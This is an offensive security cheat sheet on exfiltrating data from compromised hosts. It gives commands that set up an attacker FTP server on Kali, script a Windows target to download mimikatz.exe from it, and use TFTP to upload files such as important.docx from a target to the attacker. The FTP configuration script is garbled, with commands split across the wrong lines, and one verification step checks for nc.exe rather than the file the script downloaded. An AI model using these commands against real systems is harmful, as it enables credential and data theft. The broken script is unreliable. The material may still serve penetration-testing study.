# Exfiltration

Exfiltration is the process of unauthorized data transfer from a target system to an attacker-controlled location.

## Exfiltration for Windows

***

This cheat sheet provides steps and techniques for exfiltrating data from a compromised Windows host.

### Non-Interactive FTP (Windows)

***

Verify FTP on the Windows host.

```jsx
ftp -h
```

Start the FTP server in Kali (assuming you have `pure-ftpd` installed).

```jsx
sudo systemctl restart pure-ftpd
```

Configure the FTP server in Kali. Create a Bash script (`configure_ftp.sh`) with the following content:

```jsx
#!/bin/bash 
groupadd ftpgroup 
useradd -g ftpgroup -d /dev/null -s /etc 
ftpuser pure-pw useradd EVIL -u 
ftpuser -d /ftphome pure-pw 
mkdb cd /etc/pure-ftpd/auth/ 
ln -s ../conf/PureDB 60pdb mkdir -p /ftphome 
chown -R ftpuser:ftpgroup /ftphome/ 
systemctl restart pure-ftpd
```

Execute the script to configure the FTP server in Kali.

```jsx
sudo bash configure_ftp.sh
```

On the target host, create a text file (`ftp.txt`) containing the FTP commands to execute.

```jsx
echo open 192.168.1.1 > ftp.txt 
echo USER ftpuser >> ftp.txt 
echo lab >> ftp.txt 
echo bin >> ftp.txt 
echo GET mimikatz.exe >> ftp.txt 
echo bye >> ftp.txt
```

Initiate an FTP session from the Windows host.

```jsx
ftp -v -n -s:ftp.txt
```

Verify that the downloaded files are on the Windows host.

```jsx
C:\\\\Users\\> nc.exe -h
```

## Exfiltration for Linux

***

### TFTP

***

Configure a TFTP server in Kali (assuming you have `atftp` installed).

```jsx
sudo apt update && sudo apt install atftp 
sudo mkdir /tftp 
sudo chown nobody: /tftp 
atftpd --daemon --port 69 /tftp
```

Download a file from the target using `tftp` (replace `IP` and `FILE` with the appropriate values).

```jsx
tftp -i IP GET FILE
```

To upload files from the target to your system (Kali), use the following command (replace `IP` and `important.docx` with the appropriate values).

```jsx
tftp -i IP put important.docx
```
